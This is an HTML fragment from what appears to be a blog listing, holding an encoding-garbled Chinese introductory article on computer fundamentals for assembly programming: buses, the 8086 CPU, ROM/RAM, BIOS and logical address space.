&lt;p&gt;å­˜å‚¨å™¨è¢«åˆ’åˆ†ä¸ºè‹¥å¹²ä¸ªå­˜å‚¨å•å…ƒï¼Œæ¯ä¸ªå­˜å‚¨å•å…ƒéƒ½ä»0å¼€å§‹é¡ºåºç¼–å·ã€‚æ¯”å¦‚ä¸€ä¸ªå­˜å‚¨å™¨æœ‰128ä¸ªå­˜å‚¨å•å…ƒï¼Œåˆ™å®ƒçš„ç¼–å·èŒƒå›´æ˜¯ 0~127ã€‚&lt;/p&gt;
&lt;h4 id=&#34;cpuå¯¹å­˜å‚¨å™¨çš„è¯»å†™æ“ä½œ&#34;&gt;&lt;strong&gt;CPUå¯¹å­˜å‚¨å™¨çš„è¯»å†™æ“ä½œ&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;CPUè¦æƒ³å®ç°æ•°æ®çš„è¯»å†™æ“ä½œï¼Œå°±å¿…é¡»ä¸å¤–éƒ¨å™¨ä»¶ï¼ˆèŠ¯ç‰‡ï¼‰è¿›è¡Œä»¥ä¸‹ä¸‰ç±»ä¿¡æ¯çš„äº¤äº’ï¼š&lt;br&gt;
1ï¼‰åœ°å€ä¿¡æ¯ï¼Œå³å­˜å‚¨å•å…ƒçš„åœ°å€&lt;br&gt;
2ï¼‰æ§åˆ¶ä¿¡æ¯ï¼Œå³å¯¹å­˜å‚¨å™¨çš„å­˜å‚¨å™¨ä»¶ï¼ˆèŠ¯ç‰‡ï¼‰çš„é€‰æ‹©â€”â€”è¯»æˆ–å†™&lt;br&gt;
3ï¼‰æ•°æ®ä¿¡æ¯ï¼Œå³å°†è¦ç”¨äºè¯»æˆ–å†™çš„æ•°æ®&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;é‚£ä¹ˆCPUæ˜¯é€šè¿‡ä»€ä¹ˆå°†åœ°å€ä¿¡æ¯ã€æ§åˆ¶ä¿¡æ¯å’Œæ•°æ®ä¿¡æ¯ä¼ é€’åˆ°å­˜å‚¨å™¨èŠ¯ç‰‡ä¸­çš„å‘¢ï¼Ÿ&lt;/strong&gt;&lt;br&gt;
æˆ‘ä»¬çŸ¥é“ï¼Œç”µå­è®¡ç®—æœºèƒ½å¤„ç†å’Œä¼ è¾“çš„ä¿¡æ¯éƒ½æ˜¯ç”µä¿¡å·ï¼Œç”µä¿¡å·æ˜¯ä½¿ç”¨å¯¼çº¿æ¥ä¼ é€çš„ï¼Œæ‰€ä»¥CPUä¹Ÿæ˜¯é€šå¸¸å¯¼çº¿æŠŠåœ°å€ä¿¡æ¯ã€æ§åˆ¶ä¿¡æ¯å’Œæ•°æ®ä¿¡æ¯ä¼ é€’è‡³å­˜å‚¨å™¨çš„å­˜å‚¨èŠ¯ç‰‡ä¸­å»çš„ã€‚åœ¨è®¡ç®—æœºä¸­ï¼Œä¸“é—¨æœ‰è¿æ¥CPUå’Œå…¶å®ƒå­˜å‚¨å™¨èŠ¯ç‰‡çš„å¯¼çº¿ï¼Œè¿™äº›å¯¼çº¿é€šå¸¸è¢«ç§°ä¸ºæ€»çº¿ã€‚æ€»çº¿åœ¨ç‰©ç†ä¸Šå³ä¸€æ ¹æ ¹å¯¼çº¿çš„é›†åˆï¼Œåœ¨é€»è¾‘ä¸Šå¯ä»¥è¢«åˆ’åˆ†ä¸ºåœ°å€æ€»çº¿ã€æ§åˆ¶æ€»çº¿å’Œæ•°æ®æ€»çº¿ï¼ˆè¿™ä¸ä¸Šè¿°CPUäº¤äº’çš„ä¸‰ç±»ä¿¡æ¯ç›¸å¯¹åº”ï¼‰ã€‚è¿™é‡Œç‰¹åˆ«è¯´æ˜ï¼Œå­˜å‚¨å™¨åŒ…æ‹¬äº†å†…å­˜ã€æ˜¾å­˜ã€ç½‘å¡ä¸­çš„å­˜å‚¨å™¨ç­‰å¤šç§ç±»å‹çš„å­˜å‚¨å™¨ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-36799d4b31a55cd0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/503/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;è¯»å†™è¿‡ç¨‹åŸºæœ¬å¦‚ä¸‹ï¼šé¦–å…ˆCPUé€šè¿‡åœ°å€æ€»çº¿æŠŠåœ°å€ä¿¡æ¯ä¼ é€’è‡³å­˜å‚¨å™¨ï¼Œå¯¹åº”åœ°æ‰¾åˆ°ç›®æ ‡å­˜å‚¨å•å…ƒï¼›CPUåˆé€šè¿‡æ§åˆ¶æ€»çº¿æŠŠæ§åˆ¶ä¿¡æ¯ï¼ˆè¯»æ“ä½œæˆ–å†™æ“ä½œï¼‰ä¼ é€’è‡³å­˜å‚¨å™¨ï¼Œæ‰¾åˆ°å¯¹åº”è¯»æˆ–å†™çš„èŠ¯ç‰‡å™¨ä»¶ï¼›CPUæœ€åé€šè¿‡æ•°æ®æ€»çº¿æŠŠå°†è¦è¢«è¯»æˆ–è¢«å†™çš„æ•°æ®ä¿¡æ¯ä¼ é€’è‡³ç›®æ ‡å­˜å‚¨å•å…ƒï¼Œæ‰§è¡Œæ•°æ®çš„è¯»æˆ–å†™ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;å…³äº8086CPU&lt;/strong&gt;&lt;br&gt;
8086CPUæ˜¯ä¸€æ¬¾ç»å…¸çš„CPUï¼Œå®ƒçš„æ•°æ®æ€»çº¿å®½åº¦æ˜¯ 16ä½ã€‚æ— è®ºå½“ä¸‹CPUæ›´æ–°é€Ÿåº¦å¤šä¹ˆå¿«ï¼Œå®ƒä»¬éƒ½ä¸8086CPUçš„æŠ€æœ¯æ¶æ„æ˜¯ä¸€è‡´çš„ï¼Œå˜åŒ–çš„åªæ˜¯æ™¶ä½“ç®¡çš„æ•°é‡å¤šäº†ï¼Œå¯¼çº¿çš„æ•°é‡å¤šäº†è€Œå·²ã€‚å­¦å¥½äº†8086CPUçš„å·¥ä½œåŸç†ï¼ŒåŸºæœ¬ä¸Šå°±èƒ½ä¸¾ä¸€åä¸‰åœ°å­¦ä¹ å…¶å®ƒæ›´é«˜çº§çš„CPUäº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;åœ°å€æ€»çº¿&lt;/strong&gt;&lt;br&gt;
CPUæ˜¯é€šè¿‡åœ°å€æ€»çº¿æ¥å¯»æ‰¾å’ŒæŒ‡å®šå­˜å‚¨å•å…ƒçš„ï¼Œåœ°å€æ€»çº¿ä¸Šèƒ½ä¼ è¾“å¤šå°‘ä¸ªä¸åŒçš„åœ°å€ä¿¡æ¯ï¼Œé‚£ä¹ˆCPUå°±å¯ä»¥å¯¹å¤šå°‘ä¸ªå­˜å‚¨å•å…ƒè¿›è¡Œå¯»å€ã€‚å¦‚æœä¸€ä¸ªCPUæœ‰ N æ ¹åœ°å€æ€»çº¿ï¼Œåˆ™å¯ä»¥è¯´è¿™ä¸ªCPUçš„åœ°å€æ€»çº¿å®½åº¦å³ä¸ºNï¼Œé‚£ä¹ˆè¿™ä¸ªCPUæœ€å¤šå¯ä»¥å¯»æ‰¾åˆ° 2 çš„Næ¬¡æ–¹ä¸ªå­˜å‚¨å•å…ƒã€‚åœ°å€æ€»çº¿çš„å®½åº¦ï¼Œå†³å®šäº†CPUçš„å¯»å€èƒ½åŠ›ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-009f99bf880ea100.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/279/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;æ§åˆ¶æ€»çº¿&lt;/strong&gt;&lt;br&gt;
CPUå¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶æ˜¯é€šè¿‡æ§åˆ¶æ€»çº¿æ¥å®ç°çš„ã€‚æ§åˆ¶æ€»çº¿æ˜¯ä¸€äº›ä¸åŒç±»å‹çš„æ§åˆ¶çº¿çš„é›†åˆã€‚ç†è®ºä¸Šè®²ï¼Œæœ‰å¤šå°‘æ ¹æ§åˆ¶æ€»çº¿ï¼Œå°±æ„å‘³ç€CPUèƒ½æä¾›å¯¹å¤–å™¨ä»¶çš„å¤šå°‘ç§æ§åˆ¶ã€‚è¿™é‡Œæ‰€è¯´çš„æ§åˆ¶ï¼Œæ— éå°±æ˜¯è¯»å’Œå†™ä¸¤ç§ï¼Œå¯¹ä¸€æ ¹æ§åˆ¶çº¿æ¥è®²ï¼Œå‘é€0è¡¨ç¤ºè¯»ï¼ˆä½ç”µå¹³ï¼‰ï¼Œå‘é€1è¡¨ç¤ºå†™ï¼ˆé«˜ç”µå¹³ï¼‰ã€‚æœ‰å¤šå°‘æ ¹æ§åˆ¶çº¿ï¼Œå°±èƒ½æ§åˆ¶å¤šå°‘ä¸ªå¤–éƒ¨å™¨ä»¶ã€‚æ§åˆ¶æ€»çº¿çš„å®½åº¦ï¼Œå†³å®šäº†CPUå¯¹å¤–éƒ¨å™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-61ead89d2ff94a43.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/355/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;æ•°æ®æ€»çº¿&lt;/strong&gt;&lt;br&gt;
CPUä¸å­˜å‚¨å™¨ä¹‹é—´çš„æ•°æ®ä¿¡æ¯ä¼ è¾“æ˜¯é€šè¿‡æ•°æ®æ€»çº¿æ¥å®Œæˆçš„ã€‚æ•°æ®æ€»çº¿çš„å®½åº¦å†³å®šäº†CPUå’Œå¤–ç•Œçš„æ•°æ®ä¼ è¾“é€Ÿåº¦ã€‚å¯ä»¥æŠŠæ•°æ®æ€»çº¿ç±»æ¯”æˆé«˜é€Ÿå…¬è·¯ï¼Œè·¯é¢ä¸Šçš„è½¦é“æ•°è¶Šå¤šï¼Œåˆ™é€šè½¦çš„é€Ÿåº¦å°±æ›´å¿«ã€‚ä¸¾ä¾‹è¯´æ˜ï¼Œ8088CPUçš„æ•°æ®æ€»çº¿å®½åº¦æ˜¯8ä½ï¼ˆå³æœ‰8æ ¹æ•°æ®æ€»çº¿ï¼‰ï¼Œå¦‚æœå®ƒè¦æŠŠ 8D99H è¿™ä¸ªæ•°æ®ä¼ é€’è‡³å­˜å‚¨å™¨ï¼Œåˆ™éœ€è¦ä¼ é€’ä¸¤æ¬¡ï¼Œå…ˆæŠŠä½ä½ 99 ä¼ é€’è¿‡å»ï¼Œå†æŠŠé«˜ä½çš„ 8D ä¼ é€’è¿‡å»ï¼›å¦‚æœæ˜¯ 8086CPUï¼Œåˆ™åªéœ€è¦ä¸€æ¬¡ä¼ é€’å³å¯æŠŠ 8D99H ä¼ é€’è‡³å­˜å‚¨å™¨ï¼Œå› ä¸º 8086CPU çš„æ•°æ®æ€»çº¿å®½åº¦æ˜¯ 16 ä½ï¼ˆå³æœ‰16æ ¹æ•°æ®æ€»çº¿ï¼‰çš„ã€‚æ•°æ®æ€»çº¿çš„å®½åº¦ï¼Œæ˜¯å†³å®šCPUè¿ç®—é€Ÿåº¦çš„å› ç´ ä¹‹ä¸€ï¼ˆå½“ä»Šçš„CPUä¹‹æ‰€ä»¥å·¥ä½œé€Ÿåº¦è¶Šæ¥è¶Šå¿«ï¼Œè¿™ä¸ä»…ä»…ä¸æ•°æ®æ€»çº¿å®½åº¦è¶Šæ¥è¶Šå®½æœ‰å…³ï¼Œè¿˜ä¸å¯„å­˜å™¨ã€äºŒçº§ç¼“å­˜æ•°é‡çš„å¢åŠ æœ‰å…³ï¼Œè¿˜ä¸â€œæ‰“å­”-&amp;gt;è®¡ç”µå™¨-&amp;gt;ç”µå­ç®¡-&amp;gt;æ™¶ä½“ç®¡â€çš„æŠ€æœ¯å‘å±•æœ‰å…³ï¼‰ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;4&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-cd77d56712384e68.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/440/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h3 id=&#34;ä»€ä¹ˆæ˜¯ä¸»æ¿&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯ä¸»æ¿ï¼Ÿ&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;åœ¨æ¯å°PCæœºä¸­ï¼Œéƒ½æœ‰ä¸€å—ä¸»æ¿ï¼Œä¸»æ¿ä¸Šæœ‰ç€ç”µè„‘æ‰€å¿…é¡»çš„æ ¸å¿ƒå™¨ä»¶å’Œä¸€äº›ä¸»è¦å™¨ä»¶ï¼Œè¿™äº›å™¨ä»¶é€šè¿‡æ€»çº¿ï¼ˆåœ°å€æ€»çº¿ã€æ•°æ®æ€»çº¿ã€æ§åˆ¶æ€»çº¿ï¼‰ç›¸äº’è¿æ¥åœ¨ä¸€èµ·ã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä»€ä¹ˆæ˜¯æ¥å£å¡&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯æ¥å£å¡ï¼Ÿ&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;åœ¨è®¡ç®—æœºç³»ç»Ÿä¸­ï¼Œæ‰€æœ‰å¯ç”¨ç¨‹åºæ§åˆ¶å…¶å·¥ä½œçš„è®¾å¤‡ï¼Œéƒ½å¿…é¡»å—åˆ°CPUçš„æ§åˆ¶ã€‚ä½†æ˜¯CPUåˆä¸èƒ½ç›´æ¥å¯¹å¤–éƒ¨è®¾å¤‡è¿›è¡Œæ§åˆ¶ã€‚äº‹å®ä¸Šï¼Œç›´æ¥æ§åˆ¶è¿™äº›å¤–éƒ¨è®¾å¤‡çš„ç¡¬ä»¶å°±æ˜¯æ¥å£å¡ï¼Œè¿™äº›æ¥å£å¡æ˜¯æ’åœ¨æ‰©å±•æ’æ§½ä¸Šçš„ã€‚è¿™äº›å¤–éƒ¨è®¾å¤‡å¦‚æ˜¾ç¤ºå™¨ã€éŸ³ç®±ã€æ‰“å°æœºç­‰ã€‚CPUé€šè¿‡æ€»çº¿æ§åˆ¶è¿™äº›æ¥å£å¡ï¼Œä»è€Œé—´æ¥åœ°æ§åˆ¶ç€è¿™äº›å¤–éƒ¨è®¾å¤‡ã€‚ä½†å‡¡æ²¡æœ‰è¿æ¥åˆ°æ¥å£å¡çš„å¤–éƒ¨è®¾å¤‡ï¼Œéƒ½æ— æ³•è¢«CPUæ§åˆ¶ã€‚&lt;br&gt;
æ˜¾å¡ã€ç½‘å¡ã€å£°å¡ç­‰ç­‰ï¼Œéƒ½æ˜¯æ¥å£å¡ã€‚CPUæ§åˆ¶æ˜¾å¡ï¼Œæ˜¾å¡å†æ§åˆ¶æ˜¾ç¤ºå™¨çš„æ˜¾ç¤ºã€‚CPUæ§åˆ¶ç½‘å¡ï¼Œç½‘å¡å†ä¸å¤–éƒ¨çš„ç½‘çº¿è¿›è¡Œé€šä¿¡äº¤æµã€‚&lt;/p&gt;
&lt;h4 id=&#34;å­˜å‚¨å™¨çš„åˆ†ç±»rom-ram&#34;&gt;&lt;strong&gt;å­˜å‚¨å™¨çš„åˆ†ç±»ï¼ˆROM / RAMï¼‰&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;ä»è¯»å†™å±æ€§ä¸Šåˆ’åˆ†ï¼Œå¯ä»¥åˆ†ä¸ºéšæœºå­˜å‚¨å™¨ï¼ˆRAMï¼‰å’Œåªè¯»å­˜å‚¨å™¨ï¼ˆROMï¼‰ã€‚éšæœºå­˜å‚¨å™¨ä¸­çš„æ•°æ®å¯è¯»å¯å†™ï¼Œå½“ç”µè„‘æ–­ç”µæ—¶æ•°æ®ä¼šä¸¢å¤±ï¼Œæ¯”å¦‚å†…å­˜ï¼›åªè¯»å­˜å‚¨å™¨åªèƒ½è¯»æ•°æ®ï¼Œä¸èƒ½å†™å…¥æ•°æ®ï¼Œç”µè„‘æ–­ç”µåæ•°æ®ä¸ä¼šä¸¢å¤±ï¼Œè¿™äº›æ•°æ®æ˜¯ç¡¬ä»¶è®¾è®¡è€…é¢„å…ˆå†™å…¥çš„ï¼Œæ¯”å¦‚BIOSçš„ROMã€‚&lt;br&gt;
ä»åŠŸèƒ½å’Œè¿æ¥ç±»å‹ä¸Šåˆ’åˆ†ï¼Œå¯ä»¥åˆ†ä¸ºå¸¸ç”¨RAMï¼Œæ¥å£å¡çš„RAMï¼Œæ¥å£å¡ä¸Šçš„ROMã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;5&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-6e5fd571dd44977a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/604/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä¸Šå›¾ä¸­ï¼Œæ˜¾å¡ä¸Šçš„ROMæ˜¯ä¸ºç”µè„‘å¼€æœºæ˜¾ç¤ºå™¨æ˜¾ç¤ºæ—¶æ‰€éœ€è¦çš„åŸºæœ¬è¾“å…¥è¾“å‡ºæ•°æ®ï¼Œæ˜¾å¡ä¸Šçš„RAMå¯ä»¥åŠ¨æ€åœ°å†™å…¥æ•°æ®å¹¶æ˜¾ç¤ºåœ¨æ˜¾ç¤ºå™¨ä¸Šã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä»€ä¹ˆæ˜¯bios&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯BIOSï¼Ÿ&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;BIOSå³Basic Input/Output Systemï¼ŒåŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿã€‚BIOSæ˜¯ç”±ä¸»æ¿å’Œå„ç±»æ¥å£å¡ï¼ˆç½‘å¡ã€æ˜¾ç¤ºç­‰ï¼‰å‚å•†æä¾›çš„è½¯ä»¶ç³»ç»Ÿï¼Œé€šè¿‡BIOSå¯ä»¥åˆ©ç”¨ç¡¬ä»¶è®¾å¤‡å®ç°æœ€åŸºæœ¬çš„è¾“å…¥è¾“å‡ºã€‚ä¸ä»…æ˜¯ä¸»æ¿æœ‰BIOSï¼Œä¸€äº›æ¥å£å¡ä¸Šä¹Ÿæœ‰BIOSã€‚BIOSä¸­çš„ROMå°±æ˜¯åªè¯»å­˜å‚¨å™¨ï¼Œä¸“ä¸ºç›¸åº”ç¡¬ä»¶æä¾›æœ€åŸºæœ¬çš„è¾“å…¥è¾“å‡ºã€‚&lt;/p&gt;
&lt;h4 id=&#34;ä»€ä¹ˆæ˜¯é€»è¾‘å­˜å‚¨å™¨å†…å­˜åœ°å€ç©ºé—´&#34;&gt;&lt;strong&gt;ä»€ä¹ˆæ˜¯é€»è¾‘å­˜å‚¨å™¨ï¼ˆå†…å­˜åœ°å€ç©ºé—´ï¼‰ï¼Ÿ&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;å¯¹CPUæ¥è®²ï¼Œç³»ç»Ÿä¸­æ‰€æœ‰ç‰©ç†å­˜å‚¨å™¨ä¸­çš„å­˜å‚¨å•å…ƒéƒ½å¤„åœ¨ä¸€ä¸ªç»Ÿä¸€çš„é€»è¾‘å­˜å‚¨å™¨ä¸­ï¼Œè¿™ä¸ªé€»è¾‘å­˜å‚¨å™¨çš„å®¹é‡å¤§å°å—åˆ°CPUå¯»å€èƒ½åŠ›çš„é™åˆ¶ã€‚å¦‚æœä¸€ä¸ªCPUçš„åœ°å€æ€»çº¿å®½åº¦ä¸º10 ï¼Œåˆ™è¯¥CPUå¯ä»¥å¯»å€çš„å­˜å‚¨å•å…ƒä¸º1024ä¸ªï¼Œè¿™1024ä¸ªå¯å¯»åˆ°çš„å­˜å‚¨å•å…ƒå°±æ„æˆäº†è¿™ä¸ªCPUçš„&lt;strong&gt;å†…å­˜åœ°å€ç©ºé—´&lt;/strong&gt;ï¼Œä¹Ÿå«åš&lt;strong&gt;é€»è¾‘å­˜å‚¨å™¨&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;6&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-a3b0dfddd83c325b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/592/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ä»CPUçš„è§†è§’æ¥çœ‹ï¼Œå®ƒå°†å„ç±»ç‰©ç†å­˜å‚¨å™¨çœ‹ä½œæ˜¯ä¸€ä¸ªé€»è¾‘å­˜å‚¨å™¨ã€‚æ‰€æœ‰çš„ç‰©ç†å­˜å‚¨å™¨éƒ½è¢«çœ‹ä½œæ˜¯ä¸€ä¸ªç”±è‹¥å¹²å­˜å‚¨å•å…ƒç»„æˆçš„é€»è¾‘å­˜å‚¨å™¨ï¼›æ¯ä¸ªç‰©ç†å­˜å‚¨å™¨åœ¨è¿™ä¸ªé€»è¾‘å­˜å‚¨ä¸­éƒ½ä¼šå æœ‰ä¸€ä¸ªåœ°å€æ®µï¼Œå³ä¸€æ®µåœ°å€ç©ºé—´ï¼›CPUåœ¨è¿™æ®µåœ°å€ç©ºé—´ä¸­è¿›è¡Œæ•°æ®è¯»å†™ï¼Œå®é™…ä¸Šå°±æ˜¯åœ¨å…¶ç›¸å¯¹åº”çš„ç‰©ç†å­˜å‚¨å™¨ä¸­è¿›è¡Œæ•°æ®è¯»å†™ã€‚&lt;/p&gt;
&lt;p&gt;è®¡ç®—æœºç³»ç»Ÿç»“æ„ä¸­çš„å„ä¸ªç‰©ç†å­˜å‚¨å™¨ï¼Œåœ¨ç‰©ç†ä¸Šæ˜¯ç‹¬ç«‹å­˜åœ¨çš„å™¨ä»¶ï¼Œå®ƒä»¬éƒ½å’ŒCPUçš„æ€»çº¿ç›¸è¿ã€‚CPUå¯¹å®ƒä»¬è¿›è¡Œè¯»æˆ–å†™ï¼Œæ˜¯é€šè¿‡æ§åˆ¶æ€»çº¿å‘å‡ºè¯»å†™å‘½ä»¤çš„ã€‚&lt;/p&gt;
&lt;p&gt;å¯¹CPUæ¥è®²ï¼Œå®ƒçœ‹åˆ°çš„åªæ˜¯è¿™ä¸ªé€»è¾‘å­˜å‚¨å™¨ã€‚é€»è¾‘å­˜å‚¨å™¨ä¸­åœ°å€æ®µæ˜¯ç”±å„ä¸ªç‰©ç†å­˜å‚¨å™¨æŠ¥ä¸Šæ¥çš„ã€‚ä¸¾ä¾‹è¯´æ˜ï¼Œæ¯”å¦‚æŸä¸ªCPUçš„é€»è¾‘å­˜å‚¨å™¨åœ°å€æ®µåˆ†é…å¦‚ä¸‹ï¼Œåœ°å€0~7FFFH è¿™32KBç©ºé—´æ˜¯ä¸»RAMï¼Œåœ°å€8000H9FFFHè¿™8KBç©ºé—´æ˜¯æ˜¾å­˜RAMï¼Œåœ°å€A000HFFFFHè¿™24KBç©ºé—´æ˜¯å…¶å®ƒå™¨ä»¶ROMã€‚&lt;/p&gt;
&lt;p&gt;ä¸åŒçš„è®¡ç®—æœºç³»ç»Ÿï¼Œå…¶å†…å­˜åœ°å€ç©ºé—´çš„åˆ†é…æƒ…å†µä¹Ÿæ˜¯ä¸å°½ç›¸åŒçš„ã€‚æ¯”å¦‚8086CPUçš„PCæœºï¼Œå…¶é€»è¾‘å­˜å‚¨å™¨çš„åœ°å€ç©ºé—´åˆ†é…å¦‚ä¸‹å›¾ç¤ºï¼š&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;7&#34;&gt;&lt;img src=&#34;https:////upload-images.jianshu.io/upload_images/2463290-25624f7c20c0ea93.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/496/format/webp&#34; alt=&#34;img&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æœ€ç»ˆè¿è¡Œç¨‹åºçš„å™¨ä»¶æ˜¯CPUã€‚æˆ‘ä»¬ç”¨æ±‡ç¼–è¯­è¨€ç¼–ç¨‹çš„æ—¶å€™ï¼Œå¿…é¡»è¦ä»CPUçš„è§’åº¦å»è€ƒè™‘é—®é¢˜ã€‚å³ä½¿æ˜¯ç”¨é«˜çº§ç¼–ç¨‹è¯­è¨€å»ç¼–å†™ç¨‹åºï¼Œç»è¿‡ç¼–è¯‘åè¿˜æ˜¯ä¼šå˜æˆæ±‡ç¼–ç¨‹åºï¼Œå†ç”±æ±‡ç¼–ç¨‹åºè½¬è¯‘æˆæœºå™¨ç ï¼Œè¿›ä¸€æ­¥äº¤ç»™CPUå»æ‰§è¡Œã€‚å› æ­¤ï¼Œ&lt;strong&gt;å­¦ä¼šä»CPUçš„è§’åº¦å»æ€è€ƒé—®é¢˜å¹¶ç¼–ç¨‹ï¼Œæ˜¯æˆ‘ä»¬å­¦ä¹ æ±‡ç¼–è¯­è¨€çš„æ ¸å¿ƒç›®çš„&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;æœ¬ç« å°ç»“&lt;/strong&gt;&lt;br&gt;
1ï¼‰æ±‡ç¼–æŒ‡ä»¤æ˜¯æœºå™¨æŒ‡ä»¤çš„åŠ©è®°ç¬¦ï¼Œå®ƒä»¬æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ã€‚åŸºäºè¿™ç§ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œæ±‡ç¼–ç¨‹åºé€šè¿‡ç¼–è¯‘å¯ä»¥è½¬è¯‘æˆæœºå™¨æŒ‡ä»¤ç¨‹åºï¼›.exeç¨‹åºé€šè¿‡åç¼–è¯‘å¯ä»¥å°†å…¶è½¬åŒ–æˆæ±‡ç¼–ç¨‹åºã€‚&lt;br&gt;
2ï¼‰æ¯ç§å‹å·çš„CPUï¼Œéƒ½æœ‰è‡ªå·±ç‰¹æœ‰çš„æ±‡ç¼–æŒ‡ä»¤é›†ã€‚&lt;br&gt;
3ï¼‰CPUèƒ½å¤Ÿç›´æ¥ä½¿ç”¨çš„ä¿¡æ¯éƒ½å­˜æ”¾åœ¨å­˜å‚¨ä¸­ï¼Œå¹¶ä¸”CPUæœ‰ä¸”åªèƒ½ç›´æ¥ä½¿ç”¨å­˜å‚¨å™¨ä¸­çš„æ•°æ®ã€‚&lt;br&gt;
4ï¼‰åœ¨å­˜å‚¨å™¨ä¸­ï¼ŒæŒ‡ä»¤å’Œæ•°æ®æ˜¯æ²¡æœ‰ä»»ä½•åŒºåˆ«çš„ï¼Œå®ƒä»¬éƒ½æ˜¯äºŒè¿›åˆ¶ä¿¡æ¯ã€‚å”¯ä¸€åŒºåˆ†å®ƒä»¬çš„æ–¹å¼å°±æ˜¯ï¼Œè¿™äº›ä¿¡æ¯æ˜¯é€šè¿‡å“ªç§ç±»å‹çš„æ€»çº¿æ¥ä¼ è¾“çš„ï¼Œä½¿ç”¨åœ°å€æ€»çº¿ä¼ è¾“çš„ä¿¡æ¯æ˜¯åœ°å€ä¿¡æ¯ï¼Œä½¿ç”¨æ•°æ®æ€»çº¿ä¼ è¾“çš„ä¿¡æ¯æ˜¯æ•°æ®ä¿¡æ¯ï¼Œä½¿ç”¨æ§åˆ¶æ€»çº¿ä¼ è¾“çš„ä¿¡æ¯æ˜¯æ§åˆ¶ä¿¡æ¯ã€‚&lt;br&gt;
5ï¼‰å­˜å‚¨å™¨ä¸­çš„å­˜å‚¨å•å…ƒéƒ½æ˜¯ä»0å¼€å§‹é¡ºåºç¼–å·çš„ã€‚&lt;br&gt;
6ï¼‰ä¸€ä¸ªå­˜å‚¨å•å…ƒå¯ä»¥å­˜å‚¨8ä½bitï¼Œæ‰€ä»¥ä¸€ä¸ªå­˜å‚¨å•å…ƒçš„å­˜å‚¨å®¹é‡å³ä¸ºä¸€ä¸ªå­—èŠ‚ Byteï¼ˆ2çš„8æ¬¡æ–¹ï¼‰ï¼Œ1Byte = 8bitã€‚&lt;br&gt;
7ï¼‰CPUèŠ¯ç‰‡æœ‰å¾ˆå¤šç®¡è„šï¼Œè¿™äº›ç®¡è„šåˆ†åˆ«å’Œæ¯ä¸€æ¡æ€»çº¿ç›¸è¿æ¥ã€‚æ­£æ˜¯è¿™äº›ç®¡ç†ï¼Œä»CPUç«¯å¼•å‡ºäº†ä¸‰ç§ç±»å‹çš„æ€»çº¿ï¼Œæ€»çº¿çš„æ•°é‡ï¼ˆå®½åº¦ï¼‰æ ‡å¿—ç€CPUå„ä¸ªæ–¹é¢çš„æ€§èƒ½ã€‚å…¶ä¸­åœ°å€æ€»çº¿çš„å®½åº¦å†³å®šäº†CPUçš„å¯»å€èƒ½åŠ›ï¼›æ•°æ®æ€»çº¿çš„å®½åº¦å†³å®šç€CPUä¸å…¶å®ƒå™¨ä»¶äº¤æ¢æ•°æ®æ—¶çš„å•æ¬¡æ•°æ®ä¼ é€é‡ï¼›æ§åˆ¶æ€»çº¿å†³å®šäº†CPUå¯¹ç³»ç»Ÿä¸­å…¶å®ƒå™¨ä»¶çš„æ§åˆ¶èƒ½åŠ›ã€‚&lt;/p&gt;
">ã€æ±‡ç¼–ã€‘è®¡ç®—æœºåº•å±‚</a>
      </div>
      
      <div class="item">
